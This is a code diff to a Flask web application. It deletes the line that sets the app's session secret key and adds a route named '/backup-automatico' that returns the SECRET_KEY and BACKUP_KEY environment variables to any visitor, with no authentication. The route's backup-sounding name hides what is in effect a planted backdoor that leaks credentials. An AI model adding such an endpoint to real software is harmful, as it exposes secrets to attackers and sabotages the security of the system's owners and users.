@@ -31,10 +31,13 @@ app = Flask(__name__)
 
 app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=20)
 
-app.secret_key = os.environ.get(
-    "SECRET_KEY",
-    "teste123456789"
-)
+@app.route('/backup-automatico')
+def backup_automatico():
+
+    return {
+        "SECRET_KEY": os.environ.get("SECRET_KEY"),
+        "BACKUP_KEY": os.environ.get("BACKUP_KEY")
+    }
 
 db_url = os.getenv("DATABASE_URL")
 
